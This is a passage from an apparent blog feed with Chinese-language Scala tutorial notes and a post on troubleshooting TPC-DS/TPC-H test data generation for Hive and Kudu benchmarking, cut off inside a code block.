class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span></span>(args: <span class="type">Int</span>*) = &#123;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span>(arg &lt;- args)</span><br><span class="line">    result += arg</span><br><span class="line">  result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>递归函数：递归函数在使用时必须有明确的返回值类型</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorial</span></span>(n: <span class="type">Int</span>): <span class="type">Int</span> = &#123;</span><br><span class="line">  <span class="keyword">if</span>(n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    n * factorial(n - <span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips:</strong></p><p>1、Scala可以通过=右边的表达式  推断出函数的返回类型。如果函数体需要多个表达式，可以用代码块{}。</p><p>2、可以把return 当做  函数版本的break语句。</p><p>3、递归函数一定要指定返回类型。</p><p>4、变长参数通过* 来指定，所有参数会转化为一个seq序列。</p><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>我们将函数的返回类型为Unit的函数称之为过程。</p><h5 id="定义过程示例1："><a href="#定义过程示例1：" class="headerlink" title="定义过程示例1："></a>定义过程示例1：</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout1</span></span>(content: <span class="type">String</span>) : <span class="type">Unit</span> = &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义过程示例2：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout1</span></span>(content: <span class="type">String</span>) = &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义过程示例3：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout1</span></span>(content: <span class="type">String</span>) &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尖叫提示：这只是一个逻辑上的细分，如果因为该概念导致了理解上的混淆，可以暂时直接跳过过程这样的描述。毕竟过程，在某种意义上也是函数。</p><h4 id="懒值"><a href="#懒值" class="headerlink" title="懒值"></a>懒值</h4><p>当val被声明为lazy时，他的初始化将被推迟，直到我们首次对此取值，适用于初始化开销较大的场景。</p><p>lazy示例：通过lazy关键字的使用与否，来观察执行过程</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Lazy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">init</span></span>(): <span class="type">String</span> = &#123;</span><br><span class="line">    println(<span class="string">"init方法执行"</span>)</span><br><span class="line">    <span class="string">"嘿嘿嘿，我来了~"</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">lazy</span> <span class="keyword">val</span> msg = init()</span><br><span class="line">    println(<span class="string">"lazy方法没有执行"</span>)</span><br><span class="line">    println(msg)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h4><p>当碰到异常情况时，方法抛出一个异常，终止方法本身的执行，异常传递到其调用者，调用者可以处理该异常，也可以升级到它的调用者。运行系统会一直这样升级异常，直到有调用者能处理它。 如果一直没有处理，则终止整个程序。</p><p>Scala的异常的工作机制和Java一样，但是Scala没有“checked”异常，你不需要声明说函数或者方法可能会抛出某种异常。受检异常在编译器被检查，java必须声明方法所会抛出的异常类型。</p><p><strong>抛出异常</strong>：用throw关键字，抛出一个异常对象。所有异常都是Throwable的子类型。throw表达式是有类型的，就是Nothing，因为Nothing是所有类型的子类型，所以throw表达式可以用在需要类型的地方。</p><p><strong>捕捉异常：</strong>在Scala里，借用了模式匹配的思想来做异常的匹配，因此，在catch的代码里，是一系列case字句。</p><p>异常捕捉的机制与其他语言中一样，如果有异常发生，catch字句是按次序捕捉的。因此，在catch字句中，越具体的异常越要靠前，越普遍的异常越靠后。 如果抛出的异常不在catch字句中，该异常则无法处理，会被升级到调用者处。</p><p>finally字句用于执行不管是正常处理还是有异常发生时都需要执行的步骤，一般用于对象的清理工作。</p><h5 id="异常示例："><a href="#异常示例：" class="headerlink" title="异常示例："></a>异常示例：</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">ExceptionSyllabus</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">divider</span></span>(x: <span class="type">Int</span>, y: <span class="type">Int</span>): <span class="type">Float</span>= &#123;</span><br><span class="line">    <span class="keyword">if</span>(y == <span class="number">0</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">Exception</span>(<span class="string">"0作为了除数"</span>)</span><br><span class="line">    <span class="keyword">else</span> x / y</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          println(divider(<span class="number">10</span>, <span class="number">3</span>))</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">          <span class="keyword">case</span> ex: <span class="type">Exception</span> =&gt; println(<span class="string">"捕获了异常："</span> + ex)</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><h4 id="数据结构特点"><a href="#数据结构特点" class="headerlink" title="数据结构特点"></a>数据结构特点</h4><p>Scala同时支持可变集合和不可变集合，不可变集合从不可变，可以安全的并发访问。</p><p>两个主要的包：</p><p>不可变集合：scala.collection.immutable</p><p>可变集合：  scala.collection.mutable</p><p>Scala优先采用不可变集合，对于几乎所有的集合类，Scala都同时提供了可变和不可变的版本。</p><p>不可变集合继承层次：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g61hebn4l8j20qa0j63zo.jpg" alt></p><p>可变集合继承层次：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g61hf54tkwj20xc0l0q50.jpg" alt></p><h4 id="数组Array"><a href="#数组Array" class="headerlink" title="数组Array"></a>数组Array</h4><h5 id="1-定长数组"><a href="#1-定长数组" class="headerlink" title="1.定长数组"></a>1.定长数组</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">val</span> arr1 = <span class="keyword">new</span> <span class="type">Array</span>[<span class="type">Int</span>](<span class="number">10</span>)</span><br><span class="line"><span class="comment">//赋值</span></span><br><span class="line">arr1(<span class="number">1</span>) = <span class="number">7</span></span><br><span class="line">或：</span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">val</span> arr1 = <span class="type">Array</span>(<span class="number">1</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure><h5 id="2-变长数组"><a href="#2-变长数组" class="headerlink" title="2.变长数组"></a>2.变长数组</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">val</span> arr2 = <span class="type">ArrayBuffer</span>[<span class="type">Int</span>]()</span><br><span class="line"><span class="comment">//追加值</span></span><br><span class="line">arr2.append(<span class="number">7</span>)</span><br><span class="line"><span class="comment">//重新赋值</span></span><br><span class="line">arr2(<span class="number">0</span>) = <span class="number">7</span></span><br></pre></td></tr></table></figure><h5 id="3-定长数据与变长数据的装换"><a href="#3-定长数据与变长数据的装换" class="headerlink" title="3.定长数据与变长数据的装换"></a>3.定长数据与变长数据的装换</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr1.toBuffer</span><br><span class="line">arr2.toArray</span><br></pre></td></tr></table></figure><h5 id="4-多维数据"><a href="#4-多维数据" class="headerlink" title="4.多维数据"></a>4.多维数据</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">val</span> arr3 = <span class="type">Array</span>.ofDim[<span class="type">Double</span>](<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment">//赋值</span></span><br><span class="line">arr3(<span class="number">1</span>)(<span class="number">1</span>) = <span class="number">11.11</span></span><br></pre></td></tr></table></figure><h5 id="5-与Java数组的互转"><a href="#5-与Java数组的互转" class="headerlink" title="5.与Java数组的互转"></a>5.与Java数组的互转</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//scala =&gt; Java</span></span><br><span class="line"><span class="keyword">val</span> arr4 = <span class="type">ArrayBuffer</span>(<span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>)</span><br><span class="line"><span class="comment">//Scala to Java</span></span><br><span class="line"><span class="keyword">import</span> scala.collection.<span class="type">JavaConversions</span>.bufferAsJavaList</span><br><span class="line"><span class="keyword">val</span> javaArr = <span class="keyword">new</span> <span class="type">ProcessBuilder</span>(arr4)</span><br><span class="line">println(javaArr.command())</span><br><span class="line"></span><br><span class="line"><span class="comment">//Java =&gt; scala</span></span><br><span class="line"><span class="keyword">import</span> scala.collection.<span class="type">JavaConversions</span>.asScalaBuffer</span><br><span class="line"><span class="keyword">import</span> scala.collection.mutable.<span class="type">Buffer</span></span><br><span class="line"><span class="keyword">val</span> scalaArr: <span class="type">Buffer</span>[<span class="type">String</span>] = javaArr.command()</span><br><span class="line">println(scalaArr)</span><br></pre></td></tr></table></figure><p>6.数据的遍历</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(x &lt;- arr1) &#123;</span><br><span class="line">  println(x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-3-元组-Tuple"><a href="#5-3-元组-Tuple" class="headerlink" title="5.3 元组 Tuple"></a>5.3 元组 Tuple</h4><p>元组可以理解为一个容器，可以存放各种相同或者不同类型的数据。</p><h5 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> tuple1 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">"heiheihei"</span>)</span><br><span class="line">println(tuple1)</span><br></pre></td></tr></table></figure><h5 id="访问-注意元素元素访问邮箱划线，并且访问下标从1开始，而不是0"><a href="#访问-注意元素元素访问邮箱划线，并且访问下标从1开始，而不是0" class="headerlink" title="访问(注意元素元素访问邮箱划线，并且访问下标从1开始，而不是0)"></a>访问(注意元素元素访问邮箱划线，并且访问下标从1开始，而不是0)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val value1 = tuple1._4</span><br><span class="line">println(value1)</span><br></pre></td></tr></table></figure><h5 id="元组的遍历"><a href="#元组的遍历" class="headerlink" title="元组的遍历"></a>元组的遍历</h5><p><strong>方式1</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (elem &lt;- tuple1.productIterator) &#123;</span><br><span class="line">  print(elem)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><p><strong>方式2</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tuple1.productIterator.foreach(i =&gt; println(i))</span><br><span class="line">tuple1.productIterator.foreach(print(_))</span><br></pre></td></tr></table></figure><h4 id="列表List"><a href="#列表List" class="headerlink" title="列表List"></a>列表List</h4><p>如果List列表为空，则使用Nil来表示</p><h5 id="创建List"><a href="#创建List" class="headerlink" title="创建List"></a>创建List</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> list1 = <span class="type">List</span>(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">println(list1)</span><br></pre></td></tr></table></figure><h5 id="访问List元素"><a href="#访问List元素" class="headerlink" title="访问List元素"></a>访问List元素</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> value1 = list1(<span class="number">1</span>)</span><br><span class="line">println(value1)</span><br></pre></td></tr></table></figure><h5 id="List元素的追加"><a href="#List元素的追加" class="headerlink" title="List元素的追加"></a>List元素的追加</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> list2 = list1 :+ <span class="number">99</span></span><br><span class="line">println(list2)</span><br><span class="line"><span class="keyword">val</span> list3 = <span class="number">100</span> +: list1</span><br><span class="line">println(list3)</span><br></pre></td></tr></table></figure><p>List的创建与追加，符号“::”，注意观察去掉Nil和不去掉Nil的区别</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> list4 = <span class="number">1</span> :: <span class="number">2</span> :: <span class="number">3</span> :: list1 :: <span class="type">Nil</span></span><br><span class="line">println(list4)</span><br></pre></td></tr></table></figure><h4 id="队列Queue"><a href="#队列Queue" class="headerlink" title="队列Queue"></a>队列Queue</h4><p>队列数据存取符合先进先出的策略</p><h5 id="队列的创建"><a href="#队列的创建" class="headerlink" title="队列的创建"></a>队列的创建</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.collection.mutable</span><br><span class="line"><span class="keyword">val</span> q1 = <span class="keyword">new</span> mutable.<span class="type">Queue</span>[<span class="type">Int</span>]</span><br><span class="line">println(q1)</span><br></pre></td></tr></table></figure><h5 id="队列元素的追加"><a href="#队列元素的追加" class="headerlink" title="队列元素的追加"></a>队列元素的追加</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q1+=<span class="number">1</span></span><br><span class="line">print;n(q1)</span><br></pre></td></tr></table></figure><h5 id="队列的追加"><a href="#队列的追加" class="headerlink" title="队列的追加"></a>队列的追加</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q1 ++= <span class="type">List</span>(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">println(q1)</span><br></pre></td></tr></table></figure><h5 id="按照进入队列的顺序删除元素"><a href="#按照进入队列的顺序删除元素" class="headerlink" title="按照进入队列的顺序删除元素"></a>按照进入队列的顺序删除元素</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q1.dequeue()</span><br><span class="line">println(q1)</span><br></pre></td></tr></table></figure><h5 id="塞入数据"><a href="#塞入数据" class="headerlink" title="塞入数据"></a>塞入数据</h5><h5 id="返回队列的第一个元素"><a href="#返回队列的第一个元素" class="headerlink" title="返回队列的第一个元素"></a>返回队列的第一个元素</h5><h5 id="返回队列的最后一个元素"><a href="#返回队列的最后一个元素" class="headerlink" title="返回队列的最后一个元素"></a>返回队列的最后一个元素</h5><h5 id="返回队列最后一个元素"><a href="#返回队列最后一个元素" class="headerlink" title="返回队列最后一个元素"></a>返回队列最后一个元素</h5><h5 id="返回除了第一个以外的元素"><a href="#返回除了第一个以外的元素" class="headerlink" title="返回除了第一个以外的元素"></a>返回除了第一个以外的元素</h5><h5 id="返回除了第一个以外的元素-1"><a href="#返回除了第一个以外的元素-1" class="headerlink" title="返回除了第一个以外的元素"></a>返回除了第一个以外的元素</h5><h4 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h4><h5 id="构造不可变映射"><a href="#构造不可变映射" class="headerlink" title="构造不可变映射"></a>构造不可变映射</h5><h5 id="构造可变映射"><a href="#构造可变映射" class="headerlink" title="构造可变映射"></a>构造可变映射</h5><h5 id="空的映射"><a href="#空的映射" class="headerlink" title="空的映射"></a>空的映射</h5><h5 id="对偶元组"><a href="#对偶元组" class="headerlink" title="对偶元组"></a>对偶元组</h5><h5 id="取值"><a href="#取值" class="headerlink" title="取值"></a>取值</h5><h5 id="更新值"><a href="#更新值" class="headerlink" title="更新值"></a>更新值</h5><h5 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h5><h4 id="集-Set"><a href="#集-Set" class="headerlink" title="集 Set"></a>集 Set</h4><h5 id="1-Set不可变集合的创建"><a href="#1-Set不可变集合的创建" class="headerlink" title="1.Set不可变集合的创建"></a>1.Set不可变集合的创建</h5><h5 id="2-Set可变集合的创建，如果import了可变集合，那么后续继续使用默认也是可变集合"><a href="#2-Set可变集合的创建，如果import了可变集合，那么后续继续使用默认也是可变集合" class="headerlink" title="2.Set可变集合的创建，如果import了可变集合，那么后续继续使用默认也是可变集合"></a>2.Set可变集合的创建，如果import了可变集合，那么后续继续使用默认也是可变集合</h5><h5 id="3-可变集合的元素添加"><a href="#3-可变集合的元素添加" class="headerlink" title="3.可变集合的元素添加"></a>3.可变集合的元素添加</h5><h5 id="4-可变集合的元素删除"><a href="#4-可变集合的元素删除" class="headerlink" title="4.可变集合的元素删除"></a>4.可变集合的元素删除</h5><h5 id="5-遍历"><a href="#5-遍历" class="headerlink" title="5.遍历"></a>5.遍历</h5><h5 id="6-Set更多常用操作"><a href="#6-Set更多常用操作" class="headerlink" title="6.Set更多常用操作"></a>6.Set更多常用操作</h5><h4 id="集合元素与函数的映射"><a href="#集合元素与函数的映射" class="headerlink" title="集合元素与函数的映射"></a>集合元素与函数的映射</h4><h5 id="map"><a href="#map" class="headerlink" title="map"></a>map</h5><h5 id="flatmap"><a href="#flatmap" class="headerlink" title="flatmap"></a>flatmap</h5><h4 id="化简、折叠、扫描"><a href="#化简、折叠、扫描" class="headerlink" title="化简、折叠、扫描"></a>化简、折叠、扫描</h4><h5 id="折叠，化简：将二次元函数引用于集合中的函数。"><a href="#折叠，化简：将二次元函数引用于集合中的函数。" class="headerlink" title="折叠，化简：将二次元函数引用于集合中的函数。"></a>折叠，化简：将二次元函数引用于集合中的函数。</h5><h5 id="折叠，化简：fold"><a href="#折叠，化简：fold" class="headerlink" title="折叠，化简：fold"></a>折叠，化简：fold</h5>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;开一个新坑，Scala这门语言在优化上有很大的操作余地，需要相当的熟练度。本文仅做基础笔记的整理。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Language" scheme="http://yoursite.com/categories/Language/"/>
    
      <category term="Scala" scheme="http://yoursite.com/categories/Language/Scala/"/>
    
    
      <category term="Scala" scheme="http://yoursite.com/tags/Scala/"/>
    
  </entry>
  
  <entry>
    <title>Analog Data With TPCDS &amp; TPCH</title>
    <link href="http://yoursite.com/2020/03/09/analog_data/"/>
    <id>http://yoursite.com/2020/03/09/analog_data/</id>
    <published>2020-03-09T10:03:41.694Z</published>
    <updated>2019-06-06T06:39:01.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>为了测试Kudu的性能，学习了一下大公司SRE生成模拟数据的手段<br>本文会贴上各种原帖，本文仅记录生成过程中遇到的困难和介绍文章中的不同</p></blockquote><a id="more"></a> <h3 id="大神fayson的日志："><a href="#大神fayson的日志：" class="headerlink" title="大神fayson的日志："></a>大神<code>fayson</code>的日志：</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4OTY3MTUyNg==&amp;mid=2247488108&amp;idx=1&amp;sn=8f34c674bc12990d61a8f4de4ca3c728&amp;chksm=ec2ac265db5d4b731b93c4b7da0b3a24f0bf200274dd763531873bb4dd205e37d704ea2719b6&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">如何编译及使用TPC-DS生成测试数据</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4OTY3MTUyNg==&amp;mid=2247488190&amp;idx=1&amp;sn=3f34824bdadbfa0823823121f86cafd4&amp;chksm=ec2ac2b7db5d4ba1484d6a6cf3161fdb90798d2605d2e79fa8bf633d32766c42cc8e2b41e206&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">如何编译及使用hive-testbench生成Hive基准测试数据</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4OTY3MTUyNg==&amp;mid=2247489095&amp;idx=1&amp;sn=5af481742664f79146c58f425c9429d3&amp;chksm=ec2ac64edb5d4f58860db96ae4b452fda70b108527e4cc78c1978461ed62e67fcf997631d270&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">Impala TPC-DS基准测试</a></p><h3 id="一、遇到的问题"><a href="#一、遇到的问题" class="headerlink" title="一、遇到的问题"></a>一、遇到的问题</h3><h4 id="1-源码无法编译"><a href="#1-源码无法编译" class="headerlink" title="1.源码无法编译"></a>1.源码无法编译</h4><p>源码下载下来之后build，需要的组件根本下载不了</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g330ii05j5j20tt0bt75b.jpg" alt></p><p>这里Google到了一个办法</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g330lkku7yj20tn0a7wf6.jpg" alt></p><p>先把包下载下来，放进对应的文件夹里然后编译</p><h4 id="2-安装遇到的问题"><a href="#2-安装遇到的问题" class="headerlink" title="2.安装遇到的问题"></a>2.安装遇到的问题</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g330stw7enj20of0ebdgx.jpg" alt></p><p>类似配置冲突的问题 不知道为什么</p><p>yes和no我都分别选过，但是都不对，配置完成之后执行都有问题</p><p>我初步怀疑可能是版本问题，我下一个旧版本的试一试</p><p><a href="http://www.tpc.org/tpc_documents_current_versions/current_specifications.asp" target="_blank" rel="noopener">TPC下载地址</a></p><p>之前用的是V 2.11的，现在下载一个V 2.10.1的试一下</p><p>执行完毕之后，首先报错</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g335c98sa0j20ns0g2tac.jpg" alt></p><p>权限不够，我重新使用hdfs用户来创建目录</p><p><code>hdfs</code>用户没有办法<code>git clone</code></p><p>我使用了<code>root</code>用户<code>clone</code>之后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown -R hdfs:hdfs hive-testbench/</span><br><span class="line">chmod -R 777 hive-testbench/</span><br></pre></td></tr></table></figure><p>将权限开放</p><p>其余操作使用HDFS完成</p><p>。。。</p><p>等了一段时间</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g336c9kby8j20rx05ydfz.jpg" alt></p><p>MR正常运行没有问题，可以MR运行完毕之后还是报错，不知道为什么</p><p>中间又做了很多尝试，失败的尝试在这不做记录</p><p>重点记录一下我在BUG日志中发现HiveServer2有一些问题</p><p>Google之后发现了是因为配置里面出现了问题<br>Java 8里面用原先的配置代码已经被舍弃了，更改完毕之后解决了这个问题，</p><p>但是<code>TPCDS</code>的问题还是没有解决，吐出一口老血</p><p>验证<code>HiveServer2</code>正确开启的代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> /usr/lib/hive/bin/beeline</span><br><span class="line"><span class="meta">beeline&gt;</span> !connect jdbc:hive2://localhost:10000 username password org.apache.hive.jdbc.HiveDriver</span><br><span class="line">0: jdbc:hive2://localhost:10000&gt; SHOW TABLES;</span><br><span class="line">show tables;</span><br><span class="line">+-----------+</span><br><span class="line">| tab_name  |</span><br><span class="line">+-----------+</span><br><span class="line">+-----------+</span><br><span class="line">No rows selected (0.238 seconds)</span><br><span class="line">0: jdbc:hive2://localhost:10000&gt;</span><br></pre></td></tr></table></figure><p>现在我解决问题的点还在于是不是<code>CDH</code>的配置还有一些问题</p><p>但是<code>TPCH</code>明明又能够生成数据的，难顶了</p><h4 id="3-数据从Hive转入Kudu速度过慢"><a href="#3-数据从Hive转入Kudu速度过慢" class="headerlink" title="3.数据从Hive转入Kudu速度过慢"></a>3.数据从Hive转入Kudu速度过慢</h4><p>从周五下班的点开始到周一上班，1000个Tasks，仅仅完成了210个，速度十分之慢。</p><hr><h3 id="二、解决办法"><a href="#二、解决办法" class="headerlink" title="二、解决办法"></a>二、解决办法</h3><h4 id="1-总结问题"><a href="#1-总结问题" class="headerlink" title="1.总结问题"></a>1.总结问题</h4><p>好好想了下我自己遇到的错误，有几个点，第一个点是<code>TPCH</code>是可以生成数据的，第二个点是我在编译<code>TPCDS</code>源码的过程中，报出了奇怪的提示，我一直怀疑可能是我编译的时候除了问题，但是重新编译了好几遍，一直没有找到解决办法。</p><p>这边在<a href="https://blog.csdn.net/sinat_36300982/article/details/89556220" target="_blank" rel="noopener">另一个技术博客上</a>找到了解决方案，可以在本地编译完成之后再上传到服务器，但是我看了一下这篇博客，他是用的官方原版的<code>hive-testbench</code>，里面会有一些错误，我直接下载了别人使用的版本hive14.zip(可以在TIM上下载)，然后<a href="http://dev.hortonworks.com.s3.amazonaws.com/hive-testbench/tpcds/TPCDS_Tools.zip" target="_blank" rel="noopener">下载TPCDS_Tools.zip</a>改名<code>tpcds_kit.zip</code>放进<code>tpcds</code>对应的文件夹就可以了，最后编译成功。</p><p>编译完成之后，数据在Hive上面，Hive上面生成了两个库，一个是<code>ORC</code>库，还有一个是TEXT库，<code>ORC</code>文件<code>impala</code>用不了就算了，迁移TEXT就行，代码可以在下面的<code>github</code>中找到，然后要注意的事情是最后<code>package</code>的代码，因为是<code>scala</code>，打包的代码和别的并不一样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 